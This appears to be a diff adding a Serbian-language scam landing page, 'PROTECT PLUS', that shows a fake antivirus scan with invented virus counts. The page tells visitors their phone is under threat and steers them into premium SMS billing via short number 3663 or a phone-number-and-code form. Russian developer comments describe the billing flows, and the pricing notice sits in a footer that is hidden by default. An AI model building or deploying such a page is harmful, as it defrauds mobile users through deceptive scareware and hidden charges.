@@ -1,0 +1,295 @@
+<!DOCTYPE html>
+<html class="fw-light">
+<head>
+	<meta charset="utf-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no">
+	<title>PROTECT PLUS</title>
+	<link rel="icon" type="image/x-icon" href="img/favicon.ico" />
+	<link rel="stylesheet" media="screen" type="text/css" href="css/unlike.css" />
+	<link rel="stylesheet" media="screen" type="text/css" href="css/style.css" />
+	<script src="js/all.js"></script>
+
+</head>
+
+<body class="light">
+
+
+	<div unstyle="cn-center" class="layer_9 header grid_100p">
+		<div unstyle="cn-space to_cent" class="grid_18r">
+			<div unstyle="cn-start to_cent" class="fs-x08 fw-normal">
+				<img src="img/icon_shield.png" class="grid_1r"> 
+				<span class="c-blue-light">PROTECT</span> 
+				PLUS
+			</div>
+			<div class="c-blue-dis fs-x08 tx-center fw-normal">v. 4.04.2</div>
+		</div>
+	</div>
+
+
+
+	<div unstyle="cn-center" class="content layer_3 c-white">
+		<div unstyle="cn-around_space" class="main_text grid_18r fw-normal">
+
+			<div id="message_1" class="layer_4 grid_100p tx-center info_message_1 fs-normal fw-light part_1">Provera nivoa zaštite  telefona <span id="dots" class="grid_1r">...</span></div>
+
+			<div id="message_2" class="layer_4 info_message_2 fw-light grid_100p tx-center part_2 fs-x12">
+				<div>Testiranje je dovršeno</div>
+				<div class="c-pink ">Preporučujemo ažurirati <span class="fw-bold">antivirus</span></div>
+			</div>
+
+
+			<div id="message_data" class="layer_4 grid_18r">
+				<div id="proc" class="grid_100p fs-x20 fw-thin tx-center">0%</div>
+				<div class="progress grid_100p"><div id="progress"> </div></div>
+				<div id="folders" class="grid_100p c-silver fs-x07 tx-center">/storage/0/...inf59application.apk</div>
+			</div>
+
+
+			<div id="total_counters" unstyle="cn-space to_cent" class="layer_4 grid_18r fs-x20 fw-thin">
+				<div id="counter_timer" class="">00:00:00</div>
+				<div unstyle="cn-center to_cent">
+					<img src="img/virus.png"> 
+					<div id="counter_total" class="fs-x20">0</div>
+				</div>
+			</div>
+
+
+		</div>
+		<div id='flame' class="part_2"></div>
+	</div>
+
+	<div unstyle="container to_cent direct" class="footer">
+		<div unstyle="cn-around_around" class="usr_form">
+
+
+
+
+
+
+
+
+
+
+
+
+			<div id="desk">
+				<form id="mobileBox" action="" unstyle="cn-around_around" class="grid_18r form_data">
+
+					<div class="step_1 grid_100p tx-center fs-x09 fw-normal">
+						<div class="fw-light">Kliknite na dugme za ažuriranje</div>
+					</div>
+					<div class="step_2 grid_100p tx-center fs-x09 fw-normal">
+						<div class="fw-bold">Unesete kod</div>
+						<div>obrisali virus</div>
+					</div>
+
+
+					<div unstyle="cn-start to_cent" class="step_1 grid_13r bg-white box_tel">
+						<div class="icon_tel"> </div>
+						<div unstyle="container self_shrink" class="grid_100p">
+							<input id="tel" class="grid_100p pad_05r_lr fs-normal fw-normal" type="tel" size="12" value="381" maxlength="32">
+						</div>
+					</div>
+					<div unstyle="cn-start to_cent" class="step_2 grid_13r bg-white box_code">
+						<input id="code" class="grid_100p pad_05r_lr fs-normal fw-normal" type="text"  value="" placeholder="Kod">
+					</div>
+
+					<button class="step_1 grid_13r fs-x13 c-white">Ažurirati</button>
+					<button class="step_2 grid_13r fs-normal c-white">Unesete kod</button>
+
+					<div id="back" class="step_2 back grid_100p tx-center fs-x08 fw-normal">Drugi broj telefona</div>
+				</form>
+			<script type="text/javascript">
+			var valid_phone = false
+
+			$("#mobileBox").submit(function() {
+				if(!valid_phone) {
+					$('#tel').addClass('errors');
+				} else {
+				    $('.step_1').fadeOut(0);
+				    $('.step_2').fadeIn(300);
+				    $('#back').fadeIn(300);
+					$('#tel').removeClass('errors');
+			    	$.ajax({
+			    		type: "POST",
+			    		url: window.location.pathname,
+			    		data: $("#mobileBox").serialize(),
+			    		success: function(json)
+			    		{
+			    			var data = json != "" ? $.parseJSON(json) : {};
+			    			if (data.redirect) {
+			    				window.location.href = data.redirect;
+			    			}
+			    			if(data.status == 'showCode'){
+			    				$('.input-phone_wrap').hide(0);
+								$('.input-code_wrap').fadeIn(300);
+								$('.hidden_btn').fadeIn(300);
+			    			}
+			    			$('.error').html(data.message).show();
+			    		}
+			    	});
+			    }
+				return false;
+			});
+			$('#back').click(function() {
+				$('.step_2').fadeOut(0);
+			    $('.step_1').fadeIn(300);
+			    return false;
+			});
+			$("#mobileBox button.step_2").click(function() {
+				if ($('#code').val().length > 0) {
+					$("#code").removeClass('errors');
+					$.ajax({
+				  		type: "POST",
+				   		url: window.location.pathname,
+				   		data: $("#mobileBox").serialize(),
+				   		success: function(json)
+				   		{
+				   			alert('FIX THIS: Все получилось!');
+				   		},
+				   		error: function(){
+				   			alert('FIX THIS: Сервер недоступен или вернул ошибку')
+				   		}
+				   	});
+				} else {
+					$("#code").addClass('errors');
+				}
+			    return false;
+			});
+			</script>
+			</div>
+
+
+			<div id="mo">
+				<div unstyle="cn-around_around to_cent" class="grid_18r form_data">
+					<div class="tx-center">
+						<div class="fw-bold">Vaš telefon je pod pretnjom</div>
+					</div>
+					<a id="link" class="grid_16r fs-x11 c-white tx-center" href="">Ažurirati</a>
+				</div>
+			</div>
+
+			<div id="mt">
+				<div unstyle="cn-around_around to_cent" class="grid_18r form_data">
+					<div class="grid_100p tx-center fs-x09 fw-normal">
+						<div class="fw-bold">Da biste obrisali virus</div>
+						<div>da pošaljete SMS</div>
+						<div><span>APP 3821747792</span> na broj <span>3663</span></div>
+					</div>
+				</div>
+			</div>
+
+
+
+
+
+
+
+
+
+		</div>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+		<div  unstyle="cn-center_start" class="grid_18r fs-x08 fw-normal c-white">
+			<div unstyle="container to_cent" class="scanned grid_100p part_1">
+				<div class="icon_tools"></div>
+				  
+				<div class="grid_100p">Sistemni fajl</div>
+				<div unstyle="cn-space to_cent self_noshrink" class="grid_2r">
+					<span>0</span>
+					<div class="icon_status"></div>
+				</div>
+			</div>
+			<div unstyle="container to_cent" class="scanned grid_100p part_1">
+				<div class="icon_bag"></div>
+				  
+				<div class="grid_100p">Aplikacije</div>
+				<div unstyle="cn-space to_cent self_noshrink" class="grid_2r">
+					<span>0</span>
+					<div class="icon_status"></div>
+				</div>
+			</div>
+			<div id="files" unstyle="container to_cent" class="scanned grid_100p">
+				<div class="icon_folder"></div>
+				  
+				<div class="grid_100p">Preuzeti fajlovi</div>
+				<div unstyle="cn-space to_cent self_noshrink" class="grid_2r">
+					<span id="counter_files">0</span>
+					<div class="icon_status"></div>
+				</div>
+			</div>
+			<div id="internet" unstyle="container to_cent" class="scanned grid_100p">
+				<div class="icon_cloud"></div>
+				  
+				<div class="grid_100p">Internet keš</div>
+				<div unstyle="cn-space to_cent self_noshrink" class="grid_2r">
+					<span id="counter_internet">0</span>
+					<div class="icon_status"></div>
+				</div>
+			</div>
+			<button id="scan_stop" class="part_1 fs-x13 c-white">Zaustavi skeniranje</button>
+		</div>
+
+	</div>
+
+
+<script src="http://resourcesfiles.com/mobile_detect/mobile-detect.min.js"></script>
+	<script>
+		var obj = new Advert;
+
+
+		if (obj.md.mobile()) { // true - если моб или планшет
+			if (obj.md.phone()) { // true - если моб, false - если планшет
+				obj.setTemplatePath(); //устанавливаем шаблон СМС (? или &)
+
+				if(obj.template) { //если это не виндафон или старый iOS - идем сюда
+          obj.showBox({id: 'mo', type: 'mo', link: { id: 'link', number: '3663', body: {android: 'APP ID 3821747792 za prijem Antivirusa - Zelim da zastitim telefon bez registracije - sada. Zastititi!', ios: 'APP ID 3821747792 za prijem Antivirusa - Zelim da zastitim telefon bez registracije - sada. Zastititi!'}}}); //Показываем блок для МО
+					//Тут валидация номера и прочая ерунда
+				} else {
+					obj.showBox({id: 'mt', type: 'mt'}); // Показываем блок для МТ для старых айфонов и виндафнов
+				}
+			} else {
+				obj.showBox({id: 'mt', type: 'mt'}); //Показываем блок МТ для планшетов
+			}
+
+		} else {
+
+				obj.showBox({id: 'mt', type: 'mt'}); //Показываем блок МТ для планшетов
+
+		}
+</script>
+
+
+
+<div id="extra" class="block_disable">
+<style type="text/css">
+	#extra {position: absolute; top: 98vh; width: 100%; text-align: center; font-family: Arial;}
+	.block_enable {display: block;}
+	.block_disable {display: none;}
+	.exttra__text a {color: #999;}
+</style>
+  <div class="exttra__text" style="font-size: 11px; color: #666; margin: 0 auto;">Za korišćenje usluga na Appbox.click potrebno je platiti preko SMS sa dodatom vrednošću. Puni tekst Opštih uslova za korišćenje usluge možete da pročitate <a href="http://rs.appbox.click/page/rules">OVDE</a>.Registracijiom i slanjem SMS poruke sa dodatom vrednošću na svaki iz kratkih brojeva navedenihniže Vi prihvatate Opšte uslove usluge i potvrđujete da imate 18 godina kao i da ste Vi vlasnik brojamobilnog telefona kojeg koristite ili da imate dozvolu od vlasnika za korišćenje telefona. Svi testovi, sve igre ili aplikacije koje su predstavljene na tekućoj verziji internet strane namenjene suisključivo za korišćenje u cilju zabave. Uplate se primaju od klijenata sledećih mobilnih operatera – MTS, Telenor, VIP. Pošaljite APP na kratki broj 3663 (120 RSD sa PDV)x2 za 7 dana dostupa (VIP). Pošaljite APP na kratki broj 3663 (180 RSD sa PDV)x2 za 7 dana dostupa (MTS, Telenor). Standardna cena SMS MO za krajnjeg korisnika u mreže operatera, uključujuči PDV (MTS 3,60 RSD, Telenor 3,60 RSD, VIP 3,47 RSD). Za odjavu sa servisa pošaljite STOP na kratki broj 3663 po ceni standardnog SMSa. Mobistream OU je vlasnik ovog servisa i snosi punu odgovor nost prema njegovim korisnicima. DIMOCO je odgovoran za naplatu korisnika. U slučaju bilo kakvih pitanja u vezi sa servisom molimo Vas da nas kontaktirate na 381800812176 ili rs@mobistream.eu</div>
+</div>
+
+
+</body>
+</html>
